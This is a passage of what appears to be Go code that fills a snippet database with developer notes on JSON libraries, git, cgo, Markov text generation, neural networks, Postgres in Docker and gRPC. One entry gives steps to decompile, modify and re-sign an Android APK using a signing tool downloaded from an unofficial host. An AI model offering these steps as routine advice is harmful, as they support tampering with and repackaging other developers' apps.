\"programmers\")\nresult.ForEach(func(key, value gjson.Result) bool {\n  println(value.String()) \n  return true // keep iterating\n})")
	create(db, "Set json without serialisation\n(tags: set json sjson)\n---\n\nhttps://github.com/tidwall/sjson\n\npackage main\n\nimport \"github.com/tidwall/sjson\"\n\nconst json = `{\"name\":{\"first\":\"Janet\",\"last\":\"Prichard\"},\"age\":47}`\n\nfunc main() {\n  value, _ := sjson.Set(json, \"name.last\", \"Anderson\")\n  println(value)\n}\n\n// Set a value from empty document:\nvalue, _ := sjson.Set(\"\", \"name\", \"Tom\")\nprintln(value)\n// Output:\n// {\"name\":\"Tom\"}\n\n// Set a nested value from empty document:\nvalue, _ := sjson.Set(\"\", \"name.last\", \"Anderson\")\nprintln(value)\n// Output:\n// {\"name\":{\"last\":\"Anderson\"}}\n\n// Set a new value:\nvalue, _ := sjson.Set(`{\"name\":{\"last\":\"Anderson\"}}`, \"name.first\", \"Sara\")\nprintln(value)\n// Output:\n// {\"name\":{\"first\":\"Sara\",\"last\":\"Anderson\"}}\n\n// Update an existing value:\nvalue, _ := sjson.Set(`{\"name\":{\"last\":\"Anderson\"}}`, \"name.last\", \"Smith\")\nprintln(value)\n// Output:\n// {\"name\":{\"last\":\"Smith\"}}\n\n// Set a new array value:\nvalue, _ := sjson.Set(`{\"friends\":[\"Andy\",\"Carol\"]}`, \"friends.2\", \"Sara\")\nprintln(value)\n// Output:\n// {\"friends\":[\"Andy\",\"Carol\",\"Sara\"]\n\n// Append an array value by using the -1 key in a path:\nvalue, _ := sjson.Set(`{\"friends\":[\"Andy\",\"Carol\"]}`, \"friends.-1\", \"Sara\")\nprintln(value)\n// Output:\n// {\"friends\":[\"Andy\",\"Carol\",\"Sara\"]\n\n// Append an array value that is past the end:\nvalue, _ := sjson.Set(`{\"friends\":[\"Andy\",\"Carol\"]}`, \"friends.4\", \"Sara\")\nprintln(value)\n// Output:\n// {\"friends\":[\"Andy\",\"Carol\",null,null,\"Sara\"]\n\n// Delete a value:\nvalue, _ := sjson.Delete(`{\"name\":{\"first\":\"Sara\",\"last\":\"Anderson\"}}`, \"name.first\")\nprintln(value)\n// Output:\n// {\"name\":{\"last\":\"Anderson\"}}\n\n// Delete an array value:\nvalue, _ := sjson.Delete(`{\"friends\":[\"Andy\",\"Carol\"]}`, \"friends.1\")\nprintln(value)\n// Output:\n// {\"friends\":[\"Andy\"]}\n\n// Delete the last array value:\nvalue, _ := sjson.Delete(`{\"friends\":[\"Andy\",\"Carol\"]}`, \"friends.-1\")\nprintln(value)\n// Output:\n// {\"friends\":[\"Andy\"]}")
	create(db, "Git rename local and remote branch\n(tags: git rename branch)\n---\n\nhttps://stackoverflow.com/questions/30590083/how-do-i-rename-both-a-git-local-and-remote-branch-name\n\n// Renaming local and remote\n# Rename the local branch to the new name\ngit branch -m <old_name> <new_name>\n# Delete the old branch on remote - where <remote> is, for example, origin\ngit push <remote> --delete <old_name>\n# Or shorter way to delete remote branch [:]\ngit push <remote> :<old_name>\n# Prevent git from using the old name when pushing in the next step.\n# Otherwise, git will use the old upstream name instead of <new_name>.\ngit branch --unset-upstream <old_name>\n# Push the new branch to remote\ngit push <remote> <new_name>\n# Reset the upstream branch for the new_name local branch\ngit push <remote> -u <new_name>\n\n// Renaming Only remote branch\n# In this option, we will push the branch to the remote with the new name\n# While keeping the local name as is\ngit push <remote> <remote>/<old_name>:refs/heads/<new_name> :<old_name>")
	create(db, "Switch between users on terminal\n(tags: switch user terminal)\n---\n\n$ whoami\nuser1\n$ su - user2\nPassword:\n$ whoami\nuser2\n$ sudo -s\nPassword:\n$ whoami\nroot")
	create(db, "Cgo\n(tags: cgo)\n---\n\nhttps://github.com/golang/go/wiki/cgo\n\npackage main\n\n/*\n#include <stdio.h>\n#include <stdlib.h>\n\nvoid myprint(char* s) {\n  printf(\"%s\\n\", s);\n}\n*/\nimport \"C\"\n\nimport \"unsafe\"\n\nfunc Example() {\n  cs := C.CString(\"Hello from stdio\\n\")\n  C.myprint(cs)\n  C.free(unsafe.Pointer(cs))\n}\n\nfunc main() {\n  Example()\n}")
	create(db, "Generate text with Markov chain algorythm\n(tags: markov text)\n---\n\nhttps://kodazm.ru/articles/markov-twitter-botnet/\n\npackage main\n\nimport (\n  \"fmt\"\n  \"io/ioutil\"\n  \"math/rand\"\n  \"regexp\"\n  \"strconv\"\n  \"strings\"\n  \"tbot/internal/errors\"\n)\n\nfunc main() {\n  states := initialize(\"book.txt\")\n  word := \"human\"\n  count := 10\n  result := generateText(states, word, count)\n  fmt.Println(result)\n}\n\ntype State struct {\n  Id         int\n  Word       string\n  Count      int\n  Prob       float64\n  NextStates []State\n}\n\nfunc initialize(file string) []State {\n  text := readTxt(file)\n  return train(text)\n}\n\nfunc readTxt(path string) string {\n  data, err := ioutil.ReadFile(path)\n  errors.PanicIfErr(err)\n  dataClean := strings.Replace(string(data), \"\\n\", \" \", -1)\n  dataClean = strings.Replace(dataClean, \".\", \"\", -1)\n  dataClean = strings.Replace(dataClean, \",\", \"\", -1)\n  dataClean = strings.Replace(dataClean, \"-\", \"\", -1)\n  dataClean = strings.Replace(dataClean, \"!\", \"\", -1)\n  dataClean = strings.Replace(dataClean, \"?\", \"\", -1)\n  dataClean = strings.Replace(dataClean, \"[\", \"\", -1)\n  dataClean = strings.Replace(dataClean, \"]\", \"\", -1)\n  dataClean = strings.ToLower(dataClean)\n  dataClean = strings.Replace(dataClean, \"бог\", \"Бог\", -1)\n  return dataClean\n}\n\nfunc printLoading(n int, total int) {\n  var bar []string\n  tantPerFourty := int((float64(n) / float64(total)) * 40)\n  tantPerCent := int((float64(n) / float64(total)) * 100)\n  for i := 0; i < tantPerFourty; i++ {\n    bar = append(bar, \"█\")\n  }\n  progressBar := strings.Join(bar, \"\")\n  fmt.Printf(\"\\r \" + progressBar + \" - \" + strconv.Itoa(tantPerCent) + \"\")\n}\n\nfunc addWordToStates(states []State, word string) ([]State, int) {\n  iState := -1\n  for i := 0; i < len(states); i++ {\n    if states[i].Word == word {\n      iState = i\n    }\n  }\n  if iState >= 0 {\n    states[iState].Count++\n  } else {\n    var tempState State\n    tempState.Word = word\n    tempState.Count = 1\n\n    states = append(states, tempState)\n    iState = len(states) - 1\n\n  }\n  return states, iState\n}\n\nfunc calcMarkovStates(words []string) []State {\n  var states []State\n  //count words\n  for i := 0; i < len(words)-1; i++ {\n    var iState int\n    states, iState = addWordToStates(states, words[i])\n    if iState < len(words) {\n      states[iState].NextStates, _ = addWordToStates(states[iState].NextStates, words[i+1])\n    }\n\n    printLoading(i, len(words))\n  }\n\n  //count prob\n  for i := 0; i < len(states); i++ {\n    states[i].Prob = (float64(states[i].Count) / float64(len(words)) * 100)\n    for j := 0; j < len(states[i].NextStates); j++ {\n      states[i].NextStates[j].Prob = (float64(states[i].NextStates[j].Count) / float64(len(words)) * 100)\n    }\n  }\n  fmt.Println(\"\\ntotal words computed: \" + strconv.Itoa(len(words)))\n  return states\n}\n\nfunc textToWords(text string) []string {\n  s := strings.Split(text, \" \")\n  return s\n  words := make([]string, 0, len(s))\n  patternDigits := *regexp.MustCompile(`[\\d]`)\n  patternEngWord := *regexp.MustCompile(`[a-zA-Z]`)\n  for _, word := range s {\n    if word == \"\" || patternDigits.Match([]byte(word)) || patternEngWord.Match([]byte(word)) {\n      continue\n    }\n    words = append(words, word)\n  }\n  return words\n}\n\nfunc train(text string) []State {\n  words := textToWords(text)\n  states := calcMarkovStates(words)\n  return states\n}\n\n//-----------------\n\nfunc getNextMarkovState(states []State, word string) string {\n  iState := -1\n  for i := 0; i < len(states); i++ {\n    if states[i].Word == word {\n      iState = i\n    }\n  }\n  if iState < 0 {\n    return \"word no exist on the memory\"\n  }\n  var next State\n  next = states[iState].NextStates[0]\n  next.Prob = rand.Float64() * states[iState].Prob\n  for i := 0; i < len(states[iState].NextStates); i++ {\n    if (rand.Float64()*states[iState].NextStates[i].Prob) > next.Prob && states[iState-1].Word != states[iState].NextStates[i].Word {\n      next = states[iState].NextStates[i]\n    }\n  }\n  return next.Word\n}\n\nfunc generateText(states []State, initWord string, count int) string {\n  var generatedText []string\n  word := initWord\n  generatedText = append(generatedText, word)\n  for i := 0; i < count; i++ {\n    word = getNextMarkovState(states, word)\n    if word == \"word no exist on the memory\" {\n      return \"word no exist on the memory\"\n    }\n    generatedText = append(generatedText, word)\n  }\n  //generatedText = append(generatedText, \".\")\n  text := strings.Join(generatedText, \" \")\n  return text\n}")
	create(db, "Neural network with gonum\n(tags: neural gonum)\n---\n\nhttps://github.com/dwhitena/gophernet\n\npackage main\n\nimport (\n  \"encoding/csv\"\n  \"errors\"\n  \"fmt\"\n  \"log\"\n  \"math\"\n  \"math/rand\"\n  \"os\"\n  \"strconv\"\n  \"time\"\n\n  \"gonum.org/v1/gonum/floats\"\n  \"gonum.org/v1/gonum/mat\"\n)\n\n// neuralNet contains all of the information\n// that defines a trained neural network.\ntype neuralNet struct {\n  config  neuralNetConfig\n  wHidden *mat.Dense\n  bHidden *mat.Dense\n  wOut    *mat.Dense\n  bOut    *mat.Dense\n}\n\n// neuralNetConfig defines our neural network\n// architecture and learning parameters.\ntype neuralNetConfig struct {\n  inputNeurons  int\n  outputNeurons int\n  hiddenNeurons int\n  numEpochs     int\n  learningRate  float64\n}\n\nfunc main() {\n\n  // Form the training matrices.\n  inputs, labels := makeInputsAndLabels(\"data/train.csv\")\n\n  // Define our network architecture and learning parameters.\n  config := neuralNetConfig{\n    inputNeurons:  4,\n    outputNeurons: 3,\n    hiddenNeurons: 3,\n    numEpochs:     5000,\n    learningRate:  0.3,\n  }\n\n  // Train the neural network.\n  network := newNetwork(config)\n  if err := network.train(inputs, labels); err != nil {\n    log.Fatal(err)\n  }\n\n  // Form the testing matrices.\n  testInputs, testLabels := makeInputsAndLabels(\"data/test.csv\")\n\n  // Make the predictions using the trained model.\n  predictions, err := network.predict(testInputs)\n  if err != nil {\n    log.Fatal(err)\n  }\n\n  // Calculate the accuracy of our model.\n  var truePosNeg int\n  numPreds, _ := predictions.Dims()\n  for i := 0; i < numPreds; i++ {\n\n    // Get the label.\n    labelRow := mat.Row(nil, i, testLabels)\n    var prediction int\n    for idx, label := range labelRow {\n      if label == 1.0 {\n        prediction = idx\n        break\n      }\n    }\n\n    // Accumulate the true positive/negative count.\n    if predictions.At(i, prediction) == floats.Max(mat.Row(nil, i, predictions)) {\n      truePosNeg++\n    }\n  }\n\n  // Calculate the accuracy (subset accuracy).\n  accuracy := float64(truePosNeg) / float64(numPreds)\n\n  // Output the Accuracy value to standard out.\n  fmt.Printf(\"\\nAccuracy = %0.2f\\n\\n\", accuracy)\n}\n\n// NewNetwork initializes a new neural network.\nfunc newNetwork(config neuralNetConfig) *neuralNet {\n  return &neuralNet{config: config}\n}\n\n// train trains a neural network using backpropagation.\nfunc (nn *neuralNet) train(x, y *mat.Dense) error {\n\n  // Initialize biases/weights.\n  randSource := rand.NewSource(time.Now().UnixNano())\n  randGen := rand.New(randSource)\n\n  wHidden := mat.NewDense(nn.config.inputNeurons, nn.config.hiddenNeurons, nil)\n  bHidden := mat.NewDense(1, nn.config.hiddenNeurons, nil)\n  wOut := mat.NewDense(nn.config.hiddenNeurons, nn.config.outputNeurons, nil)\n  bOut := mat.NewDense(1, nn.config.outputNeurons, nil)\n\n  wHiddenRaw := wHidden.RawMatrix().Data\n  bHiddenRaw := bHidden.RawMatrix().Data\n  wOutRaw := wOut.RawMatrix().Data\n  bOutRaw := bOut.RawMatrix().Data\n\n  for _, param := range [][]float64{\n    wHiddenRaw,\n    bHiddenRaw,\n    wOutRaw,\n    bOutRaw,\n  } {\n    for i := range param {\n      param[i] = randGen.Float64()\n    }\n  }\n\n  // Define the output of the neural network.\n  output := new(mat.Dense)\n\n  // Use backpropagation to adjust the weights and biases.\n  if err := nn.backpropagate(x, y, wHidden, bHidden, wOut, bOut, output); err != nil {\n    return err\n  }\n\n  // Define our trained neural network.\n  nn.wHidden = wHidden\n  nn.bHidden = bHidden\n  nn.wOut = wOut\n  nn.bOut = bOut\n\n  return nil\n}\n\n// backpropagate completes the backpropagation method.\nfunc (nn *neuralNet) backpropagate(x, y, wHidden, bHidden, wOut, bOut, output *mat.Dense) error {\n\n  // Loop over the number of epochs utilizing\n  // backpropagation to train our model.\n  for i := 0; i < nn.config.numEpochs; i++ {\n\n    // Complete the feed forward process.\n    hiddenLayerInput := new(mat.Dense)\n    hiddenLayerInput.Mul(x, wHidden)\n    addBHidden := func(_, col int, v float64) float64 { return v + bHidden.At(0, col) }\n    hiddenLayerInput.Apply(addBHidden, hiddenLayerInput)\n\n    hiddenLayerActivations := new(mat.Dense)\n    applySigmoid := func(_, _ int, v float64) float64 { return sigmoid(v) }\n    hiddenLayerActivations.Apply(applySigmoid, hiddenLayerInput)\n\n    outputLayerInput := new(mat.Dense)\n    outputLayerInput.Mul(hiddenLayerActivations, wOut)\n    addBOut := func(_, col int, v float64) float64 { return v + bOut.At(0, col) }\n    outputLayerInput.Apply(addBOut, outputLayerInput)\n    output.Apply(applySigmoid, outputLayerInput)\n\n    // Complete the backpropagation.\n    networkError := new(mat.Dense)\n    networkError.Sub(y, output)\n\n    slopeOutputLayer := new(mat.Dense)\n    applySigmoidPrime := func(_, _ int, v float64) float64 { return sigmoidPrime(v) }\n    slopeOutputLayer.Apply(applySigmoidPrime, output)\n    slopeHiddenLayer := new(mat.Dense)\n    slopeHiddenLayer.Apply(applySigmoidPrime, hiddenLayerActivations)\n\n    dOutput := new(mat.Dense)\n    dOutput.MulElem(networkError, slopeOutputLayer)\n    errorAtHiddenLayer := new(mat.Dense)\n    errorAtHiddenLayer.Mul(dOutput, wOut.T())\n\n    dHiddenLayer := new(mat.Dense)\n    dHiddenLayer.MulElem(errorAtHiddenLayer, slopeHiddenLayer)\n\n    // Adjust the parameters.\n    wOutAdj := new(mat.Dense)\n    wOutAdj.Mul(hiddenLayerActivations.T(), dOutput)\n    wOutAdj.Scale(nn.config.learningRate, wOutAdj)\n    wOut.Add(wOut, wOutAdj)\n\n    bOutAdj, err := sumAlongAxis(0, dOutput)\n    if err != nil {\n      return err\n    }\n    bOutAdj.Scale(nn.config.learningRate, bOutAdj)\n    bOut.Add(bOut, bOutAdj)\n\n    wHiddenAdj := new(mat.Dense)\n    wHiddenAdj.Mul(x.T(), dHiddenLayer)\n    wHiddenAdj.Scale(nn.config.learningRate, wHiddenAdj)\n    wHidden.Add(wHidden, wHiddenAdj)\n\n    bHiddenAdj, err := sumAlongAxis(0, dHiddenLayer)\n    if err != nil {\n      return err\n    }\n    bHiddenAdj.Scale(nn.config.learningRate, bHiddenAdj)\n    bHidden.Add(bHidden, bHiddenAdj)\n  }\n\n  return nil\n}\n\n// predict makes a prediction based on a trained\n// neural network.\nfunc (nn *neuralNet) predict(x *mat.Dense) (*mat.Dense, error) {\n\n  // Check to make sure that our neuralNet value\n  // represents a trained model.\n  if nn.wHidden == nil || nn.wOut == nil {\n    return nil, errors.New(\"the supplied weights are empty\")\n  }\n  if nn.bHidden == nil || nn.bOut == nil {\n    return nil, errors.New(\"the supplied biases are empty\")\n  }\n\n  // Define the output of the neural network.\n  output := new(mat.Dense)\n\n  // Complete the feed forward process.\n  hiddenLayerInput := new(mat.Dense)\n  hiddenLayerInput.Mul(x, nn.wHidden)\n  addBHidden := func(_, col int, v float64) float64 { return v + nn.bHidden.At(0, col) }\n  hiddenLayerInput.Apply(addBHidden, hiddenLayerInput)\n\n  hiddenLayerActivations := new(mat.Dense)\n  applySigmoid := func(_, _ int, v float64) float64 { return sigmoid(v) }\n  hiddenLayerActivations.Apply(applySigmoid, hiddenLayerInput)\n\n  outputLayerInput := new(mat.Dense)\n  outputLayerInput.Mul(hiddenLayerActivations, nn.wOut)\n  addBOut := func(_, col int, v float64) float64 { return v + nn.bOut.At(0, col) }\n  outputLayerInput.Apply(addBOut, outputLayerInput)\n  output.Apply(applySigmoid, outputLayerInput)\n\n  return output, nil\n}\n\n// sigmoid implements the sigmoid function\n// for use in activation functions.\nfunc sigmoid(x float64) float64 {\n  return 1.0 / (1.0 + math.Exp(-x))\n}\n\n// sigmoidPrime implements the derivative\n// of the sigmoid function for backpropagation.\nfunc sigmoidPrime(x float64) float64 {\n  return sigmoid(x) * (1.0 - sigmoid(x))\n}\n\n// sumAlongAxis sums a matrix along a\n// particular dimension, preserving the\n// other dimension.\nfunc sumAlongAxis(axis int, m *mat.Dense) (*mat.Dense, error) {\n\n  numRows, numCols := m.Dims()\n\n  var output *mat.Dense\n\n  switch axis {\n  case 0:\n    data := make([]float64, numCols)\n    for i := 0; i < numCols; i++ {\n      col := mat.Col(nil, i, m)\n      data[i] = floats.Sum(col)\n    }\n    output = mat.NewDense(1, numCols, data)\n  case 1:\n    data := make([]float64, numRows)\n    for i := 0; i < numRows; i++ {\n      row := mat.Row(nil, i, m)\n      data[i] = floats.Sum(row)\n    }\n    output = mat.NewDense(numRows, 1, data)\n  default:\n    return nil, errors.New(\"invalid axis, must be 0 or 1\")\n  }\n\n  return output, nil\n}\n\nfunc makeInputsAndLabels(fileName string) (*mat.Dense, *mat.Dense) {\n  // Open the dataset file.\n  f, err := os.Open(fileName)\n  if err != nil {\n    log.Fatal(err)\n  }\n  defer f.Close()\n\n  // Create a new CSV reader reading from the opened file.\n  reader := csv.NewReader(f)\n  reader.FieldsPerRecord = 7\n\n  // Read in all of the CSV records\n  rawCSVData, err := reader.ReadAll()\n  if err != nil {\n    log.Fatal(err)\n  }\n\n  // inputsData and labelsData will hold all the\n  // float values that will eventually be\n  // used to form matrices.\n  inputsData := make([]float64, 4*len(rawCSVData))\n  labelsData := make([]float64, 3*len(rawCSVData))\n\n  // Will track the current index of matrix values.\n  var inputsIndex int\n  var labelsIndex int\n\n  // Sequentially move the rows into a slice of floats.\n  for idx, record := range rawCSVData {\n\n    // Skip the header row.\n    if idx == 0 {\n      continue\n    }\n\n    // Loop over the float columns.\n    for i, val := range record {\n\n      // Convert the value to a float.\n      parsedVal, err := strconv.ParseFloat(val, 64)\n      if err != nil {\n        log.Fatal(err)\n      }\n\n      // Add to the labelsData if relevant.\n      if i == 4 || i == 5 || i == 6 {\n        labelsData[labelsIndex] = parsedVal\n        labelsIndex++\n        continue\n      }\n\n      // Add the float value to the slice of floats.\n      inputsData[inputsIndex] = parsedVal\n      inputsIndex++\n    }\n  }\n  inputs := mat.NewDense(len(rawCSVData), 4, inputsData)\n  labels := mat.NewDense(len(rawCSVData), 3, labelsData)\n  return inputs, labels\n}")
	create(db, "Neural network with GoNN\n(tags: neural gonn)\n---\n\nhttps://habr.com/ru/post/343466/\n\npackage main\n\nimport (\n  \"fmt\"\n  \"github.com/fxsjy/gonn/gonn\"\n)\n\nfunc main() {\n  // create neural net and save it in file gonn\n  CreateNN()\n\n  // load NN from file\n  nn := gonn.LoadNN(\"gonn\")\n\n  hp := 0.7 // (0.1 - 1.0)\n  weapon := 1.0 //(0 - no, 1 - yes)\n  enemyCount := 1.0\n\n  // Get answer from NN\n  out := nn.Forward([]float64{hp, weapon, enemyCount})\n  fmt.Println(GetResult(out))\n}\n\nfunc CreateNN() {\n  // Create NN with 3 input neurons, 16 hidden, 4 outputs\n  nn := gonn.DefaultNetwork(3, 16, 4, false)\n\n  // Create slice with input params:\n  // 0 param - hp (0.1 - 1.0)\n  // 1 param - have weapon (0 - no, 1 - yes)\n  // 2 param - enemy count\n  input := [][]float64 {\n    {0.5, 1, 1}, {0.9, 1, 2}, {0.8, 0, 1},\n    {0.3, 1, 1}, {0.6, 1, 2}, {0.4, 0, 1},\n    {0.9, 1, 7}, {0.6, 1, 4}, {0.1, 0, 1},\n    {0.6, 1, 0}, {1, 0, 0} }\n\n  // What we want to get in result\n  // 0 param \"Attack\"\n  // 1 param \"Creep\"\n  // 2 param \"Run\"\n  // 3 param \"Nothing\"\n  target := [][]float64 {\n    {1, 0, 0, 0}, {1, 0, 0, 0}, {1, 0, 0, 0},\n    {0, 1, 0, 0}, {0, 1, 0, 0}, {0, 1, 0, 0},\n    {0, 0, 1, 0}, {0, 0, 1, 0}, {0, 0, 1, 0},\n    {0, 0, 0, 1}, {0, 0, 0, 1} }\n\n  // Train NN with 100000 iterations\n  nn.Train(input, target, 100000)\n\n  // Save NN in file\n  gonn.DumpNN(\"gonn\", nn)\n}\n\nfunc GetResult(output []float64) string {\n  max := -99999.0\n  pos := -1\n  // Get one output neuron with biggest weight\n  for i, value := range output {\n    if value > max {\n      max = value\n      pos = i\n    }\n  }\n  \n  switch pos {\n  case 0: return \"Attack\"\n  case 1: return \"Creep\"\n  case 2: return \"Run\"\n  case 3: return \"Nothing\"\n  }\n  return \"\"\n}")
	create(db, "Neural network with golearn\n(tags: neural golearn)\n---\n\nhttps://github.com/sjwhitworth/golearn\nhttps://github.com/sjwhitworth/golearn/blob/master/examples/datasets/iris.csv\n\n// go get \"github.com/gonum/matrix\"\n\npackage main\n\nimport (\n  \"fmt\"\n\n  \"github.com/sjwhitworth/golearn/base\"\n  \"github.com/sjwhitworth/golearn/evaluation\"\n  \"github.com/sjwhitworth/golearn/knn\"\n)\n\nfunc main() {\n  // Load in a dataset, with headers. Header attributes will be stored.\n  // Think of instances as a Data Frame structure in R or Pandas.\n  // You can also create instances from scratch.\n  rawData, err := base.ParseCSVToInstances(\"datasets/iris.csv\", false)\n  if err != nil {\n    panic(err)\n  }\n\n  // Print a pleasant summary of your data.\n  fmt.Println(rawData)\n\n  //Initialises a new KNN classifier\n  cls := knn.NewKnnClassifier(\"euclidean\", \"linear\", 2)\n\n  //Do a training-test split\n  trainData, testData := base.InstancesTrainTestSplit(rawData, 0.50)\n  cls.Fit(trainData)\n\n  //Calculates the Euclidean distance and returns the most popular label\n  predictions, err := cls.Predict(testData)\n  if err != nil {\n    panic(err)\n  }\n\n  // Prints precision/recall metrics\n  confusionMat, err := evaluation.GetConfusionMatrix(testData, predictions)\n  if err != nil {\n    panic(fmt.Sprintf(\"Unable to get confusion matrix: %s\", err.Error()))\n  }\n  fmt.Println(evaluation.GetSummary(confusionMat))\n}")
	create(db, "Git syntax\n(tags: git syntax)\n---\n\nhttps://cheatography.com/mikesac/cheat-sheets/base-git/\n\n//// Global Config­uration\n// Globally configure your committer name\ngit config --global user.name \"John Doe\"\n// Globally configure your committer email\ngit config --global user.email johndoe@example.com\n  \n//// Initialize new repository\n// Initialize current directory as a new git repostiroy\ngit init\n// Add remote repository with name 'origin'\ngit remote add origin https://repourl/repo.git\n// Promote all folder content for commit\ngit add --all  \n// Commit all files with given comment\ngit commit -am\"initial commit\"\n  \n//// Clone existing remote repostiroy\n// Clone remote repository via HTTPS, access credential could be reqeuired\ngit clone https://giturl/repo.git\n// Clone remote repository via SSH, privat­e/p­ublic key exchange is required\ngit clone ssh://giturl/repo.git\n  \n//// Inspect your work\n// Provide you with the difference in commits and push between your local repo and the remote origin\ngit status\n// List latest commit on the local repository\ngit log\n// Provide a diff view between the local file and the HEAD version on the remote origin\ngit diff ${FILENAME}\n  \n//// Save you work\n// Retrieve all commit from remote repository named \"­ori­gin­\" and branch \"­dev­elo­p\" and merge them into local repository\ngit pull origin develop\n// Promote ALL unstaged files for commit - use with care!\ngit add --all  \n// Promote given file/f­older for commit\ngit add ${FILENAME}\n// Commit all promoted file to local repository\ngit commit -m\"my details on commit\"\n// Push all commit to remote repository named \"­ori­gin­\" and branch \"­dev­elo­p\". Branch will be created if not present. May fail if remote repository has not been pulled before pushing since local repository is not up-to-date\ngit push origin develop\n  \n//// Branching\n// List all avaiable branches\ngit branch -a\n// Fetch all remote repository data into local one, including new branches\ngit fetch\n// Fetch all remote repository data into local one, including new branches. -p (prune) causes unexisting remote branches to be dropped also locally\ngit fetch -p\n// Create a new branch named \"­new­bra­nch­\" starting from current commit\ngit checkout -b newbranch\n// Merge local branch named \"­oth­erb­ran­ch\" to be merged into current local branch\ngit merge otherbranch\n// Push all commit in local branch newbranch to remote origin, creating remote branch if not already present\ngit push origin newbranch\n// Delete local branch named \"­old­bra­nch­\". Any tag pushed from deleted branch will be preserved.\ngit branch -D oldbranch\n// Delete remote branch named \"­old­bra­nch­\". Any tag pushed from deleted branch will be preserved.\ngit push origin --delete oldbranch\n// Merge branch named \"­fea­tur­ebr­anc­h\" into current one, squasshing all commit into a single one. Commit with comment is needed to complete operation.\ngit merge --squash featurebranch\n  \n//// Tagging\n// List all avaiable tags\ngit tag -l\n// Fetch all remote repository data into local one, including tags\ngit fetch --tags\n// Fetch all remote repository data into local one, including new tags. -p (prune) causes unexisting remote tags to be dropped also locally\ngit fetch --tags -p\n// Creates a new tag named \"­myt­ag\" and attach it to current local commit\ngit tag mytag\n// Push local tags to remote origin\ngit push origin --tags\n// Delete local tag named \"­old­tag­\".\ngit tag -d oldtag\n// Delete remote tag named \"­old­tag­\".\ngit push origin :refs/tags/oldtag\n  \n//// Cleaning up your repository\n// Reset local repository commit to remote origin on branch master. All changes will be preserved as uncomm­itted files\ngit reset --soft origin master\n// Reset local repository commit to remote origin on branch master. All changes will be discarted - use with care!\ngit reset --hard origin master\n// Remove untracked files - show only candidates no actual removal (alias -n )\ngit clean --dry-run\n// Remove untracked files - Actual remove use with care!\ngit clean -f\n// Remove untracked files and folders - Actual remove use with care!\ngit clean -f -d\n// Remove ignored files - Actual remove use with care!\ngit clean -f -X\n// Remove ignored and non-ig­nored files - Actual remove use with care!\ngit clean -f -x\n// Show history for ${FILE­NAME} even if deleted, useful to know when a file has been removed\ngit log -- ${FILENAME}\n  \n\nhttps://gitsheet.wtf/\n\nBranches.     \ngit branch                     List all local branches.   \ngit branch -a                 List remote and local branches.   \ngit checkout -b branch_name   Create a local branch and switch to it.   \ngit checkout branch_name      Switch to an existing branch.   \ngit push origin branch_name   Push branch to remote.   \ngit branch -m new_name         Rename current branch.   \ngit branch -d branch_name     Delete a local branch.   \ngit push origin :branch_name  Delete a remote branch.\n\nLogs.     \ngit log --oneline       Show commit history in single lines.   \ngit log -2               Show commit history for last N commits.   \ngit log -p -2           Show commit history for last N commits with diff.   \ngit diff                Show all local file changes in the working tree.   \ngit diff myfile         Show changes made to a file.   \ngit blame myfile        Show who changed what & when in a file.   \ngit remote show origin  Show remote branches and their mapping to local.\n\nCleanup.     \ngit clean -f           Delete all untracked files.   \ngit clean -df          Delete all untracked files and directories.   \ngit checkout -- .      Undo local modifications to all files.   \ngit reset HEAD myfile  Unstage a file.\n\nTags.     \ngit pull --tags        Get remote tags.   \ngit checkout tag_name  Switch to an existing tag.   \ngit tag                List all tags.   \ngit tag -a tag_name -m \"tag message\"  Create a new tag.   \ngit push --tags        Push all tags to remote repo.\n\nStashes.     \ngit stash save \"stash name\" && git stash  Save changes to a stash.   \ngit stash list  List all stashes.   \ngit stash pop   Apply a stash and delete it from stash list.")
	create(db, "Postgresql in docker\n(tags: postgresql docker)\n---\n\ndocker run --name some-postgres -e POSTGRES_PASSWORD=mysecretpassword -d -p 5433:5432 postgres\ndocker exec -it some-postgres bash\nsu postgres\npsql\n  \\l - list of databases\n  \\c dbname - switch to database\n    \\dt - list of tables\n    \\d table - struct of table\n    \\du - list of users and permissions\n    \\dt+ - list of tables with descriptions\n    \\dt *s* - list of tables that contains \"s\" in name\n    \\i FILE - exec commands from FILE\n    \\o FILE - save result into FILE.\n    \\a - swith aligment mode\n  \\? - list of all commands\n  \\q - quit")
	create(db, "Reverse Engineering with android apk on Windows\n(tags: ri android apk windows)\n---\n\n1. Download apk from PlayMarket or from special site\n2. Installed apk in android device - data/app\n3. Cope apk to PC\n4. Install apktool and Sign (instructions - https://androidp1.ru/dekompilyatsiya-apk-prilozheniya-android/)\n  (apktool - https://bitbucket.org/iBotPeaches/apktool/downloads/)\n  (folder with Sign - https://clouds.androidp1.ru/2o/Sign.zip)\n5. Copy all to C:/apktool/\n6. Rename apk for simple usage, example app.apk\n7. In PowerShell: ./apktool d app.apk\n8. In folder \"C:/apktool/app/\" change .smali files how you want and save \n9. From C:/apktool/ folder exec in PowerShell: ./apktool b app\n10. Copy C:/apktool/app/dist/app.apk into folder C:/apktool/Sign\n11. Drag and drop app.apk on aign_APK.bat icon\n12. Created apk_signed.apk copy to device and install")
	create(db, "Using gRPC\n(tags: grpc protobuf)\n---\n\n// apt install golang-goprotobuf-dev\n// go get github.com/golang/protobuf/protoc-gen-go\n// /home/app# protoc -I=/home/app --go_out=/home/app /home/app/tutorial/tutorial.proto\n\n// /home/app/tutorail/tutorial.proto\nsyntax = \"proto3\";\npackage tutorial;\n\nimport \"google/protobuf/timestamp.proto\";\n\nmessage Person {\n  string name = 1;\n  int32 id = 2;  // Unique ID number for this person.\n  string email = 3;\n\n  enum PhoneType {\n    MOBILE = 0;\n    HOME = 1;\n    WORK = 2;\n  }\n\n  message PhoneNumber {\n    string number = 1;\n    PhoneType type = 2;\n  }\n\n  repeated PhoneNumber phones = 4;\n\n  google.protobuf.Timestamp last_updated = 5;\n}\n\n// Our address book file is just one of these.\nmessage AddressBook {\n  repeated Person people = 1;\n}\n\n\n// /home/app/list_people.go\npackage main\n\nimport (\n  \"fmt\"\n  \"io\"\n  \"io/ioutil\"\n  \"log\"\n  \"os\"\n  pb \"./tutorial\"\n  \"github.com/golang/protobuf/proto\"\n)\n\nfunc writePerson(w io.Writer, p *pb.Person) {\n  fmt.Fprintln(w, \"Person ID:\", p.Id)\n  fmt.Fprintln(w, \"  Name:\", p.Name)\n  if p.Email != \"\" {\n    fmt.Fprintln(w, \"  E-mail address:\", p.Email)\n  }\n\n  for _, pn := range p.Phones {\n    switch pn.Type {\n    case pb.Person_MOBILE:\n      fmt.Fprint(w, \"  Mobile phone #: \")\n    case pb.Person_HOME:\n      fmt.Fprint(w, \"  Home phone #: \")\n    case pb.Person_WORK:\n      